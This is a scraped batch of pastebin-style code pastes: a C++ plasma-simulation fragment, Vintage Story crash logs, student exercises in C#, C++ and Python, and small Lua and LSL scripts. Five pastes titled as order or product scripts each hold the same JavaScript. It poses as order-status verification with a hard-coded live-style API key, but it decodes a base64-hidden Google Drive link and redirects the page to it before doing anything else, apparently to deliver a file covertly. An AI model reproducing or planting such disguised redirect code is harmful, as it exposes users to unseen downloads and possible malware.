            //     int bin = (int)( (electrons[i].energy - Emin)/bin_width_smooth );
            //     if (bin >=0 && bin < N)
            //     histo_maxwell[bin]++;
            // }

            // // writing data each time step
            // for (int i = 0; i < N_smooth; i++){
            //     double bin_center = Emin + (i + 0.5) * bin_width_smooth;
            //     file << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; //f(E)
            //     histo_maxwell[i] = 0;
            // }

            // //     //instead, writing energies each timestep:

            // // for (int i = 0; i < n_e; i++){
            // //     file << i << "" "" << electrons[i].energy << ""\n"";
            // // }


            // file.close();

            // }


            // end writing data each timestep

            // std::cout << ""number excitation collisions at timestep: "" << t << "" "" << ""is: "" << exc2_coll_counter_temp << ""\n"";             
            // std::cout << ""number superelatic collisions at timestep: "" << t << "" "" << ""is: "" << super2_coll_counter_temp << ""\n"";   
            file_temp << t << "" "" <<  super1_coll_counter_temp << "" "" << exc1_coll_counter_temp;
            file_temp << "" "" <<  super2_coll_counter_temp << "" "" << exc2_coll_counter_temp << ""\n"";      

//            file_temp << t << "" "" <<  exc_1.size() << "" "" << exc_2.size() << ""\n"";     


    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";

    // ----- final electron energies distribution ends

    // // ------ excited atoms histogram --------/////

    // for (int i = 0; i < exc_1.size(); i++) {

    //     file14 << i << "" "" << exc_1[i].energy << ""\n"";

    //     int bin = static_cast<int>( (exc_1[i].energy - Emin)/bin_width);
    //     if (bin >=0 && bin < histo_excited.size())
    //         histo_excited[bin]++;        
    // }

    // for (int i = 0; i < histo_excited.size(); i++){

    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file15 << bin_center << "" "" <<  static_cast<double>(histo_excited[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)
    // }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""# of steps: "" << steps << ""\n"";
    std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""triplet:________"" << ""\n"";
    std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""singlet:________"" << ""\n"";
    std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";    

    std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
1xpM5RMb,Crash Log 16/4/2025 Astria Porta,ArttieF,C,Wednesday 16th of April 2025 06:03:14 PM CDT,"Game Version: v1.20.7 (Stable)
4/16/2025 2:31:25PM: Critical error occurred
Loaded Mods: 
System.NullReferenceException: Object reference not set to an instance of an object.
   at AstriaPorta.Content.ItemStargateDebugTablet.OnUnloaded(ICoreAPI api) in C:\Users\wilfe\source\repos\astria_porta\AstriaPorta\AstriaPorta\src\Item\ItemStargateDebugTablet.cs:line 194
   at Vintagestory.Client.NoObf.ClientMain.Dispose() in VintagestoryLib\Client\ClientMain.cs:line 2786
   at Vintagestory.Client.NoObf.ClientMain.DestroyGameSession(Boolean gotDisconnected) in VintagestoryLib\Client\ClientMain.cs:line 2675
   at Vintagestory.Client.GuiScreenConnectingToServer.onCancel() in VintagestoryLib\Client\MainMenu\Screens\GuiScreenConnectingToServer.cs:line 206
   at Vintagestory.API.Client.GuiElementTextButton.OnMouseUpOnElement(ICoreClientAPI api, MouseEvent args) in VintagestoryApi\Client\UI\Elements\Impl\Interactive\Controls\GuiElementTextButton.cs:line 318
   at Vintagestory.API.Client.GuiElementTextButton.OnMouseUp(ICoreClientAPI api, MouseEvent args) in VintagestoryApi\Client\UI\Elements\Impl\Interactive\Controls\GuiElementTextButton.cs:line 306
   at Vintagestory.API.Client.GuiComposer.OnMouseUp(MouseEvent mouse) in VintagestoryApi\Client\UI\GuiComposer.cs:line 447
   at GuiScreen.OnMouseUp(MouseEvent e) in VintagestoryLib\Client\MainMenu\Screens\Special\GuiScreen.cs:line 204
   at Vintagestory.Client.ScreenManager.OnMouseUp(MouseEvent e) in VintagestoryLib\Client\ScreenManager.cs:line 914
   at Vintagestory.Client.NoObf.ClientPlatformWindows.Mouse_ButtonUp(MouseButtonEventArgs e) in VintagestoryLib\Client\ClientPlatform\Input.cs:line 211
   at OpenTK.Windowing.Desktop.NativeWindow.OnMouseUp(MouseButtonEventArgs e)
   at OpenTK.Windowing.Desktop.NativeWindow.MouseButtonCallback(Window* window, MouseButton button, InputAction action, KeyModifiers mods)
--- End of stack trace from previous location ---
   at OpenTK.Windowing.Desktop.NativeWindow.RethrowCallbackExceptionsIfNeeded()
   at OpenTK.Windowing.Desktop.NativeWindow.ProcessWindowEvents(Boolean waitForEvents)
   at OpenTK.Windowing.Desktop.GameWindow.Run()
   at Vintagestory.Client.ClientProgram.Start(ClientProgramArgs args, String[] rawArgs) in VintagestoryLib\Client\ClientProgram.cs:line 334
   at Vintagestory.Client.ClientProgram.<>c__DisplayClass10_0.<.ctor>b__1() in VintagestoryLib\Client\ClientProgram.cs:line 130
   at Vintagestory.ClientNative.CrashReporter.Start(ThreadStart start) in VintagestoryLib\Client\ClientPlatform\ClientNative\CrashReporter.cs:line 93
Game Version: v1.20.7 (Stable)
4/16/2025 3:58:05PM: Critical error occurred
Loaded Mods: aculinaryartillery@1.2.5, angelbelt@1.6.0, antlershorns@1.0.1, axleinblocks@1.20.1-rc.5, betterandimprovedweather@0.1.0, bettercrates@1.8.0, bettertraders@0.0.9, cheesemoredelicious@1.0.0, chiseltools@1.14.16, claycasting@1.2.2, clicktopick@2.0.0, craftablemetalparts@1.0.0, doublebackpackcapacity@0.0.1, dressedtokill@1.2.0, FlexibleTools@3.4.1, goblinears@2.1.1, hangingoillamps@1.0.3, honeypressmittim@1.0.2, millwright@1.2.0, MoreTorchHolders@1.0.0, npclibrary@0.1.2, npcelves@0.0.4, npcgoblins@0.0.1, npchalflings@0.0.4, npchumans@0.0.4, npckobolds@0.0.4, npcorcs@0.0.4, unochre@1.3.0, oils@1.2.3, OresAPlenty@3.3.0, OresAPlentyAddon@1.1.0, primitivesurvival@3.7.6, quicklimepk@1.1.0, RareDenseOres@0.2.7, resmeltableslight@1.1.2, saltandsands@1.1.0, sirixbetterstorage2123@1.1.0, spyglass@0.5.2, tprunes@1.1.1, temporal_gears_stack@1.0.0, game@1.20.7, vsimgui@1.1.8, alchemy@1.6.49, apegrapes@1.2.6, astriaporta@0.0.2, egocaribautomapmarkers@4.0.1, bedspawnv2@1.4.0, BetterCrocksSirix@1.0.2, betterfirepit@1.1.5, betterjonasdevicesfixed@2.0.2, betterpitkilntimer@1.1.0, betterruins@0.4.11, blacksmithenhancements@1.1.4, blastfurnace@1.0.0, carryon@1.8.0-rc.4, coinage@1.13.3, commonlib@2.6.1, composter@1.2.1, compostgrass@1.20.7-dev.2, configlib@1.5.2, Crateful@1.2.8, cropseedstage@1.0.1, cuniculture@1.0.3, danatweaks@3.4.1, electricity@0.0.12, remiel_sawsticks@1.0.0, envelopes@1.2.2, expandedfoods@1.7.4, foodshelves@1.5.3, fromgoldencombs@1.8.12, heatretention@1.0.2, improvedhandbookrecipes@1.1.3, joyofsailing@1.4.0-rc.5, knapster@2.14.4, maketea@0.3.1, metaltongs@1.2.3, meteoricexpansion-reborn@1.3.0, minimalcompass@1.1.3, mobsradar@2.1.6, monstersonlyunderground@1.0.2, morepiles@2.1.3, nocharcoallost@1.0.1, nocokelost@1.0.0, norottinghides@1.0.0, pelaguswinds@1.0.0, petai@3.3.1, pewter@1.2.3, pileful@1.1.5, remotetradercheckmod@0.2.3, simplefootstepsredux@1.0.1, smithingplus@1.6.0-rc.1, solidirondoor@1.0.1, spawnersapi@1.1.3, statushudcont@3.2.6, steamandpower@1.6.4, steelanvil@1.0.0, stirlingmotor@1.0.0, stonebakeoven@1.1.6, vanillamoremolds@1.1.2, versionchecker@1.1.0, vinconomy@0.4.0, creative@1.20.7, vsinstrumentsbase@2.0.1, survival@1.20.7, wildfarmingrevival@1.3.6, advancedchests@0.2.4, apanserbjornstory@0.9.6, autoconfiglib@2.0.6, battletowers@1.0.6, cats@3.2.0, electricityaddon@0.0.20, electricityextensions@0.0.8, em@3.2.1, feverstonewilds@1.5.0-rc.2, helvehammerext@1.7.0, pabrass@1.0.2, paelectrum@1.0.1, pagoldsilver@1.0.2, sandwich@1.2.8, shearlib@1.1.2, stonequarry@3.4.3, wolftaming@3.0.6, tailorsdelight@1.9.5, ashes@1.2.0, wool@1.6.2, dressmakers@1.5.2
System.InvalidOperationException: Can't use a disposed shader!
   at Vintagestory.Client.NoObf.ShaderProgramBase.Use() in VintagestoryLib\Client\ClientPlatform\ShaderProgramBase.cs:line 420
   at AstriaPorta.Content.EventHorizonRenderer.OnRenderFrame(Single deltaTime, EnumRenderStage stage) in C:\Users\wilfe\source\repos\astria_porta\AstriaPorta\AstriaPorta\src\BlockEntityRenderer\EventHorizonRenderer.cs:line 101
   at Vintagestory.Client.NoObf.ClientMain.TriggerRenderStage(EnumRenderStage stage, Single dt) in VintagestoryLib\Client\ClientMain.cs:line 814
   at Vintagestory.Client.NoObf.ClientMain.MainRenderLoop(Single dt) in VintagestoryLib\Client\ClientMain.cs:line 825
   at Vintagestory.Client.GuiScreenRunningGame.RenderToPrimary(Single dt) in VintagestoryLib\Client\MainMenu\Screens\GuiScreenRunningGame.cs:line 161
   at Vintagestory.Client.ScreenManager.Render(Single dt) in VintagestoryLib\Client\ScreenManager.cs:line 695
   at Vintagestory.Client.ScreenManager.OnNewFrame(Single dt) in VintagestoryLib\Client\ScreenManager.cs:line 670
   at Vintagestory.Client.NoObf.ClientPlatformWindows.window_RenderFrame(FrameEventArgs e) in VintagestoryLib\Client\ClientPlatform\GameWindow.cs:line 127
   at OpenTK.Windowing.Desktop.GameWindow.Run()
   at Vintagestory.Client.ClientProgram.Start(ClientProgramArgs args, String[] rawArgs) in VintagestoryLib\Client\ClientProgram.cs:line 334
   at Vintagestory.Client.ClientProgram.<>c__DisplayClass10_0.<.ctor>b__1() in VintagestoryLib\Client\ClientProgram.cs:line 130
   at Vintagestory.ClientNative.CrashReporter.Start(ThreadStart start) in VintagestoryLib\Client\ClientPlatform\ClientNative\CrashReporter.cs:line 93"
mHSCfD71,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 06:01:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68705/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p7yE680b,Aluno.cs,estevaorada,C#,Wednesday 16th of April 2025 05:55:30 PM CDT,"using System;

public class Aluno
{
    // Atributos da classe
    private string nome;
    private int matricula;
    private double nota1;
    private double nota2;
    private string curso;

    // Construtor
    public Aluno(string nome, int matricula, double nota1, double nota2, string curso)
    {
        this.nome = nome;
        this.matricula = matricula;
        this.nota1 = nota1;
        this.nota2 = nota2;
        this.curso = curso;
    }

    // Métodos que retornam dados
    public string GetNome()
    {
        return nome;
    }

    public int GetMatricula()
    {
        return matricula;
    }

    public double GetNota1()
    {
        return nota1;
    }

    public double GetNota2()
    {
        return nota2;
    }

    public string GetCurso()
    {
        return curso;
    }

    public double CalcularMedia()
    {
        return (nota1 + nota2) / 2;
    }

    public string SituacaoAluno()
    {
        double media = CalcularMedia();
        return media >= 7 ? ""Aprovado"" : ""Reprovado"";
    }

    public string DadosCompletos()
    {
        return $""Nome: {nome}, Matrícula: {matricula}, Curso: {curso}"";
    }

    public string NotasFormatadas()
    {
        return $""Nota 1: {nota1}, Nota 2: {nota2}"";
    }

    public string MediaFormatada()
    {
        return $""Média: {CalcularMedia():F2}"";
    }
}"
JnfVNAch,Animal.cs,estevaorada,C#,Wednesday 16th of April 2025 05:51:28 PM CDT,"public class Animal
{
    // Atributos (campos privados)
    private string nome;
    private string especie;
    private int idade;
    private double peso;
    private string habitat;

    // Construtor
    public Animal(string nome, string especie, int idade, double peso, string habitat)
    {
        this.nome = nome;
        this.especie = especie;
        this.idade = idade;
        this.peso = peso;
        this.habitat = habitat;
    }

    // Métodos

    public string Descricao()
    {
        return $""{nome} é um(a) {especie} com {idade} anos, pesando {peso}kg, que vive no {habitat}."";
    }

    public bool EstaNaNatureza()
    {
        return habitat.ToLower() != ""domesticado"" && habitat.ToLower() != ""casa"";
    }

    public string FaixaEtaria()
    {
        if (idade < 2) return ""Filhote"";
        if (idade < 7) return ""Adulto"";
        return ""Idoso"";
    }

    public string ClassificacaoPeso()
    {
        if (peso < 5) return ""Muito leve"";
        else if (peso < 20) return ""Leve"";
        else if (peso < 100) return ""Médio"";
        return ""Pesado"";
    }

    public string InformacoesRapidas()
    {
        return $""Nome: {nome}, Espécie: {especie}, Habitat: {habitat}"";
    }

    public string FichaVeterinaria()
    {
        return $""Paciente: {nome}\nEspécie: {especie}\nIdade: {idade} anos\nPeso: {peso} kg\nHabitat: {habitat}"";
    }

    public string Identificacao()
    {
        return $""{especie.ToUpper()} - {nome.ToLower()}"";
    }

    public string OndeVive()
    {
        return $""{nome} normalmente vive em: {habitat}"";
    }

    public string Som()
    {
        return $""{nome} emite um som típico de um(a) {especie}."";
    }

    public string Status()
    {
        return idade > 10 ? ""Animal em idade avançada."" : ""Animal em idade ativa."";
    }
}
"
LDX4CHrh,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 05:46:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94623/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FjtbjZCB,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 05:30:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42713/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Rnhi3EKQ,Другий семестр. Лабораторна робота №11-12 (Завдання 2),Lavig,C++,Wednesday 16th of April 2025 05:20:30 PM CDT,"#include <iostream>
#include <windows.h>

using namespace std;

int days_number(int year, int month, int day) {
    int days_in_month[] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
    if (year % 4 == 0) {
        days_in_month[1] = 29;
    }
    int total_days = 0;
    for (int i = 0; i < month - 1; ++i) {
        total_days += days_in_month[i];
    }
    total_days += day;
    return total_days;
}
int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    int year, month, day;
    while (true) {
        cout << ""Введіть рік: "";
        cin >> year;
        if (cin.fail()) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Рік було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    while (true) {
        cout << ""Введіть номер місяця (1-12): "";
        cin >> month;
        if (cin.fail() || month < 1 || month > 12) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Номер місяця було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    while (true) {
        cout << ""Введіть номер дня (1-31): "";
        cin >> day;
        if (cin.fail() || day < 1 || day > 31) {
            cin.clear();
            cin.ignore(32767, '\n');
            cout << ""Номер дня було введено неправильно. Спробуйте ще раз!"" << endl;
            continue;
        }
        else {
            break;
        }
    }
    int result = days_number(year, month, day);
    cout << ""Кількість днів від початку року до цієї дати: "" << result << endl;
}"
h7pLewNX,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 05:16:20 PM CDT,"# MatveyPanchenko DSAI-03
import numpy as np, matplotlib.pyplot as plt
from scipy.integrate import solve_ivp

osc = lambda t, y: (y[1], -y[0])          # x' = v, v' = –x
sol = solve_ivp(osc, (0, 10), (1., 0.), t_eval=np.linspace(0, 10, 200))
t, x, v = sol.t, *sol.y

fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(10, 4))
ax1.plot(t, x, label='x(t)')
ax1.plot(t, v, label='v(t)')
ax1.set(title='Time Domain', xlabel='t'); ax1.legend(); ax1.grid()

ax2.plot(x, v, 'r-', label='Phase')
ax2.set(title='Phase Plot', xlabel='x', ylabel='v'); ax2.legend(); ax2.grid()

fig.tight_layout(); plt.show()
"
Fzc8rYsh,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 05:15:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05930/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LatXdR8H,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 05:14:54 PM CDT,"# MatveyPanchenko DSAI-03
import sympy as sp, math

def rref(M, e=1e-12):
    A, m, n, r, c, piv = [row[:] for row in M], len(M), len(M[0]), 0, 0, []
    while r < m and c < n:
        k = next((i for i in range(r, m) if abs(A[i][c]) > e), None)
        if k is None: c += 1; continue
        A[r], A[k] = A[k], A[r]
        d = A[r][c]; A[r] = [x / d for x in A[r]]
        for i in range(m):
            if i != r and abs(A[i][c]) > e:
                f = A[i][c]; A[i] = [u - f * v for u, v in zip(A[i], A[r])]
        piv.append(c); r += 1; c += 1
    return A, piv

def null_space(M):
    R, piv = rref(M); n = len(R[0]); free = [j for j in range(n) if j not in piv]
    if not free: return [[0]*n]
    B = []
    for f in free:
        v = [0]*n; v[f] = 1
        for i, p in enumerate(piv): v[p] = -R[i][f]
        B.append(v)
    return B

si = lambda A, l: [[A[i][j] - (l if i == j else 0) for j in range(3)] for i in range(3)]

def char_coeffs(A):
    a, b, c = A[0]; d, e, f = A[1]; g, h, i = A[2]
    tr = a + e + i
    s2 = a*e + a*i + e*i - b*d - c*g - f*h
    det = a*(e*i - f*h) - b*(d*i - f*g) + c*(d*h - e*g)
    return 1, -tr, s2, -det

A = [list(map(float, input().split())) for _ in range(3)]
p = char_coeffs(A)
λ = sp.symbols('λ')
poly = p[0]*λ**3 + p[1]*λ**2 + p[2]*λ + p[3]
vals = [complex(sp.N(v)) for v in sp.solve(poly, λ)]
vals = [v.real if abs(v.imag) < 1e-10 else v for v in vals]

print(""Eigenvalues:"")
for v in vals:
    print(v)

print(""Eigenvectors:"")
for l in vals:
    v = next((u for u in null_space(si(A, l)) if any(abs(x) > 1e-12 for x in u)), [0]*3)
    n = math.sqrt(sum(abs(x)**2 for x in v))
    v = [x / n for x in v] if n > 1e-12 else v
    print(v)
"
afEx4g7g,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 05:12:43 PM CDT,"# MatveyPanchenko DSAI-03
from copy import deepcopy

tr = lambda m: [list(r) for r in zip(*m)]

def rref(a, eps=1e-12):
    A = deepcopy(a)
    r = c = 0
    rows, cols = len(A), len(A[0])
    piv = []
    while r < rows and c < cols:
        k = next((i for i in range(r, rows) if abs(A[i][c]) > eps), None)
        if k is None:
            c += 1
            continue
        A[r], A[k] = A[k], A[r]
        p = A[r][c]
        A[r] = [x / p for x in A[r]]
        for i in range(rows):
            if i != r and abs(A[i][c]) > eps:
                f = A[i][c]
                A[i] = [u - f * v for u, v in zip(A[i], A[r])]
        piv.append(c)
        r += 1
        c += 1
    return A, piv

row_basis = lambda a: [r for r in rref(a)[0] if any(abs(x) > 1e-12 for x in r)]
def col_basis(a):
    _, piv = rref(a)
    return [[a[i][j] for i in range(len(a))] for j in piv]

def null_basis(a):
    R, piv = rref(a)
    n = len(R[0])
    free = [j for j in range(n) if j not in piv]
    B = []
    for f in free:
        v = [0] * n
        v[f] = 1
        for i, p in enumerate(piv):
            v[p] = -R[i][f]
        B.append(v)
    return B

if __name__ == ""__main__"":
    r = int(input(""rows: ""))
    A = [list(map(float, input().split())) for _ in range(r)]
    print(""Row space:"", row_basis(A))
    print(""Column space:"", col_basis(A))
    print(""Row null space:"", null_basis(tr(A)))
    print(""Column null space:"", null_basis(A))
"
iTGFENnp,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 05:10:48 PM CDT,"# MatveyPanchenko DSAI-03
from copy import deepcopy

def rref(a, eps=1e-12):
    m, piv, r, c = deepcopy(a), [], 0, 0
    rows, cols = len(m), len(m[0])
    while r < rows and c < cols:
        k = max(range(r, rows), key=lambda i: abs(m[i][c]))
        if abs(m[k][c]) < eps:
            c += 1
            continue
        m[r], m[k] = m[k], m[r]
        piv.append(c)
        p = m[r][c]
        m[r] = [x / p for x in m[r]]
        for i in range(rows):
            if i != r:
                f = m[i][c]
                m[i] = [u - f * v for u, v in zip(m[i], m[r])]
        r += 1; c += 1
    return m, piv

t = lambda m: [list(r) for r in zip(*m)]

def col_space(a, piv): return [[row[j] for row in a] for j in piv]
def row_space(r): return [row for row in r if any(abs(x) > 1e-12 for x in row)]

def null_space(r, piv):
    n = len(r[0])
    free = [j for j in range(n) if j not in piv]
    basis = []
    for f in free:
        v = [0]*n; v[f] = 1
        for i, p in enumerate(piv):
            v[p] = -sum(r[i][k]*v[k] for k in range(n))
        basis.append(v)
    return basis

def subspaces(a):
    r1, p1 = rref(a)
    r2, p2 = rref(t(a))
    return (col_space(a, p1), row_space(r1),
            null_space(r1, p1), null_space(r2, p2))

read_mat = lambda: [list(map(float, input().split())) for _ in range(int(input(""rows: "")))]
round_mat = lambda m, p=2: [[round(x, p) for x in row] for row in m]

if __name__ == ""__main__"":
    A = read_mat()
    cs, rs, ns, lns = (round_mat(s) for s in subspaces(A))
    print(""Column Space:"", cs)
    print(""Row Space:"", rs)
    print(""Null Space:"", ns)
    print(""Left Null Space:"", lns)
"
zZsizdGW,mine2,HappySunChild,Lua,Wednesday 16th of April 2025 05:04:21 PM CDT,"if #arg == 0 then
	arg = { ... }
end

local xSize, ySize, zSize = tonumber(arg[1]), tonumber(arg[2]), tonumber(arg[3])

local function forward()
	repeat
		turtle.dig()
	until turtle.forward()
end

local function mineX()
	for _ = 1, xSize do
		turtle.digUp()
		turtle.digDown()

		forward()
	end

	turtle.digUp()
	turtle.digDown()
end

local function mineZ(y)
	for z = 1, zSize do
		mineX()

		if z == zSize then
			break
		end

		local d = 0

		-- only alternate if even z size
		if zSize % 2 == 0 then
			d = y - 1
		end

		if z % 2 ~= d then
			turtle.turnRight()

			forward()

			turtle.turnRight()
		else
			turtle.turnLeft()

			forward()

			turtle.turnLeft()
		end
	end
end

for y = 1, math.abs(ySize) do
	mineZ(y)

	turtle.turnRight()
	turtle.turnRight()

	if y == math.abs(ySize) then
		break
	end

	if ySize < 0 then
		for _ = 1, 3 do
			turtle.digDown()
			turtle.down()
		end
	else
		for _ = 1, 3 do
			turtle.digUp()
			turtle.up()
		end
	end
end
"
X6C86v98,Untitled,Madi_Perth,Linden Scripting,Wednesday 16th of April 2025 05:03:33 PM CDT,"list playingAnimations;

default
{

    
    link_message(integer source, integer num, string str, key id)
    {
       /* llOwnerSay(""source: "" + (string) source +
        "" num: "" + (string) num +
        "" str: "" + str +
        "" key: "" + (string) id);
        */
        if (str == ""START_ANIM"")
        {
            llOwnerSay(""Now Playing "" + (string)id);
        }
    }
}"
9ewp0CDY,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 04:59:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18395/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
